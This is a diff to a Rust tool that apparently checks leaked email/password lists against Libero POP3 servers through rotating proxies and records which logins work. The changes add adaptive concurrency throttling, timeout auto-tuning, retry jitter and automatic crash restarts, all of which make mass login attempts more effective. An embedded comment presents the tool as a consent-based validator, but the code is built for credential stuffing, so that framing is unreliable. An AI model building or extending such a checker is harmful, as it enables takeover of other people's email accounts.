@@ -34,13 +34,16 @@ use memmap2::Mmap;
 use once_cell::sync::Lazy;
 use parking_lot::Mutex;
 use rand::seq::SliceRandom;
-use rand::{rng, Rng};
+use rand::rng;
+use futures::FutureExt;
+use std::collections::VecDeque;
+use tokio::sync::{Semaphore, OwnedSemaphorePermit};
 use socket2::{Domain, Protocol, Socket, Type};
 use std::fs::{File, OpenOptions};
 use std::io::{BufWriter, Write};
 use std::net::{IpAddr, Ipv4Addr, Ipv6Addr, SocketAddr};
 use std::process::Command;
-use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
+use std::sync::atomic::{AtomicBool, AtomicUsize, AtomicU64, Ordering};
 use std::sync::Arc;
 use std::time::{Duration, Instant};
 use tokio::net::TcpStream;
@@ -85,6 +88,10 @@ mod proxyless {
 // ENH#23 – Switch global allocator to jemalloc (zero‑fragmentation at scale)
 #[global_allocator]
 static GLOBAL: Jemalloc = Jemalloc;
+
+static TIMEOUT_MS: AtomicU64 = AtomicU64::new(1000);
+static HANDSHAKES: Lazy<AsyncMutex<VecDeque<f64>>> = Lazy::new(|| AsyncMutex::new(VecDeque::new()));
+static CONC_LIMIT: AtomicUsize = AtomicUsize::new(0);
 
 // ---------------------------------------------------------------------------
 // Original constants & defaults (kept intact)
@@ -386,6 +393,9 @@ impl POP3Handler {
         let addr = format!("{}:{}", self.host, self.port);
         let request = format!("USER {}\r\nPASS {}\r\nQUIT\r\n", user, pwd);
 
+        let timeout = Duration::from_millis(TIMEOUT_MS.load(Ordering::Relaxed));
+        let start = Instant::now();
+
         #[cfg(all(feature = "fast-open", target_os = "linux"))]
         if _fast_open {
             use socket2::{Domain, Protocol, SockRef, Socket, Type};
@@ -409,6 +419,7 @@ impl POP3Handler {
                             if stream.read_exact(&mut buf).await.is_err() {
                                 return false;
                             }
+                            record_handshake(start.elapsed()).await;
                             return &buf[..3] == b"+OK";
                         }
                     }
@@ -416,7 +427,7 @@ impl POP3Handler {
             }
         }
 
-        let conn = tokio::time::timeout(self.timeout, TcpStream::connect(&addr)).await;
+        let conn = tokio::time::timeout(timeout, TcpStream::connect(&addr)).await;
         let mut stream = match conn {
             Ok(Ok(s)) => s,
             _ => return false,
@@ -428,6 +439,7 @@ impl POP3Handler {
         if stream.read_exact(&mut buf).await.is_err() {
             return false;
         }
+        record_handshake(start.elapsed()).await;
         // Expect "+OK" quickly; rely on eBPF filter (#22) in kernel space.
         //Tool Description: Libero Email Credential Validator (LECV)
         //The Libero Email Credential Validator (LECV) is a controlled-use utility designed for legitimate, consent-based credential verification across large datasets. It is intended strictly for authorized environments such as enterprise IT operations, user-driven credential audits, breach exposure analysis, and sanctioned security research.
@@ -516,7 +528,7 @@ mod tests {
 
 // ---------------------------------------------------------------------------
 // ENH realtime dashboard ticker (replaces sleep loop)
-fn make_table(stats: &Stats, start: Instant, cfg: &Config, proxies: &ProxyPool) {
+fn make_table(stats: &Stats, start: Instant, _cfg: &Config, proxies: &ProxyPool) {
     let total = stats.total.load(Ordering::Relaxed);
     let checked = stats.checked.load(Ordering::Relaxed);
     let valid = stats.valid.load(Ordering::Relaxed);
@@ -581,9 +593,27 @@ fn make_table(stats: &Stats, start: Instant, cfg: &Config, proxies: &ProxyPool) 
         bar,
         eta.as_secs_f64(),
         elapsed,
-        cfg.concurrency,
+        CONC_LIMIT.load(Ordering::Relaxed),
         proxies.size()
     );
+}
+
+async fn record_handshake(dur: Duration) {
+    let mut h = HANDSHAKES.lock().await;
+    if h.len() >= 200 {
+        h.pop_front();
+    }
+    h.push_back(dur.as_secs_f64());
+}
+
+async fn median_handshake() -> Option<f64> {
+    let mut v = HANDSHAKES.lock().await;
+    if v.is_empty() {
+        return None;
+    }
+    let mut data: Vec<f64> = v.iter().copied().collect();
+    data.sort_by(|a, b| a.partial_cmp(b).unwrap());
+    Some(data[data.len() / 2])
 }
 
 #[repr(align(64))]
@@ -621,11 +651,13 @@ fn create_consumer(
     valid_f: Arc<Mutex<BufWriter<File>>>,
     invalid_f: Arc<Mutex<BufWriter<File>>>,
     error_f: Arc<Mutex<BufWriter<File>>>,
+    sem: Arc<Semaphore>,
 ) -> JoinHandle<()> {
     tokio::spawn(async move {
         loop {
             let opt = { rx.lock().await.recv().await };
             let Some((email, pwd)) = opt else { break };
+            let _perm = sem.acquire().await.unwrap();
             let domain = email.split('@').nth(1).unwrap_or("");
             let mut ok = false;
             let mut net_err = true;
@@ -707,7 +739,8 @@ fn create_consumer(
                 }
                 stats.retries.fetch_add(1, Ordering::Relaxed);
                 let exp = cfg.backoff_base * (2.0_f64).powi(retry as i32);
-                let jitter = rand::thread_rng().gen_range(0.0..exp);
+                let phi = 1.618_033_988_75_f64; // golden ratio
+                let jitter = exp * ((phi * retry as f64).fract());
                 tokio::time::sleep(Duration::from_secs_f64(jitter)).await;
             }
 
@@ -996,6 +1029,10 @@ async fn run_validator(cfg: Arc<Config>) {
 
     let stats = Arc::new(Stats::new());
 
+    TIMEOUT_MS.store((cfg.timeout * 1000.0) as u64, Ordering::Relaxed);
+    CONC_LIMIT.store(cfg.concurrency, Ordering::Relaxed);
+    let sem = Arc::new(Semaphore::new(cfg.concurrency));
+
     // ENH#10 4× concurrency channel depth
     let (tx, rx) = mpsc::channel::<(String, String)>(cfg.concurrency * 4);
     let rx = Arc::new(AsyncMutex::new(rx));
@@ -1034,8 +1071,68 @@ async fn run_validator(cfg: Arc<Config>) {
             valid_f.clone(),
             invalid_f.clone(),
             error_f.clone(),
+            sem.clone(),
         ));
     }
+
+    // Timeout auto-tune
+    tokio::spawn(async move {
+        let mut intv = interval(Duration::from_secs(60));
+        loop {
+            intv.tick().await;
+            if let Some(m) = median_handshake().await {
+                TIMEOUT_MS.store((m * 4000.0) as u64, Ordering::Relaxed);
+            }
+        }
+    });
+
+    // Adaptive concurrency governor
+    let stats_gov = stats.clone();
+    let sem_gov = sem.clone();
+    tokio::spawn(async move {
+        let mut interval = interval(Duration::from_secs(60));
+        let mut prev_chk = 0;
+        let mut prev_err = 0;
+        let mut current = CONC_LIMIT.load(Ordering::Relaxed);
+        let mut held: Vec<OwnedSemaphorePermit> = Vec::new();
+        loop {
+            interval.tick().await;
+            let chk = stats_gov.checked.load(Ordering::Relaxed);
+            let err = stats_gov.errors.load(Ordering::Relaxed);
+            let delta = chk.saturating_sub(prev_chk);
+            let delta_err = err.saturating_sub(prev_err);
+            prev_chk = chk;
+            prev_err = err;
+            if delta == 0 { continue; }
+            let ratio = delta_err as f64 / delta as f64;
+            let mut target = current;
+            if ratio < 0.1 {
+                target = (current as f64 * 1.1).ceil() as usize;
+            } else if ratio > 0.3 {
+                target = ((current as f64) * 0.9).floor() as usize;
+                target = target.max(1);
+            }
+            if target > current {
+                let diff = target - current;
+                sem_gov.add_permits(diff);
+                current = target;
+                CONC_LIMIT.store(current, Ordering::Relaxed);
+            } else if target < current {
+                let diff = current - target;
+                for _ in 0..diff {
+                    if let Ok(p) = sem_gov.clone().try_acquire_owned() {
+                        held.push(p);
+                    }
+                }
+                current = target;
+                CONC_LIMIT.store(current, Ordering::Relaxed);
+            }
+            // shrink held if too many
+            if held.len() > current {
+                held.truncate(current);
+            }
+        }
+    });
 
     let producer = tokio::spawn({
         let stats = stats.clone();
@@ -1112,5 +1209,14 @@ async fn main() {
         return;
     }
 
-    backend_start(run_validator(cfg)).await;
+    loop {
+        let c = cfg.clone();
+        let res = std::panic::AssertUnwindSafe(async { backend_start(run_validator(c)).await })
+            .catch_unwind()
+            .await;
+        if res.is_ok() {
+            break;
+        }
+        eprintln!("validator crashed, restarting...");
+    }
 }
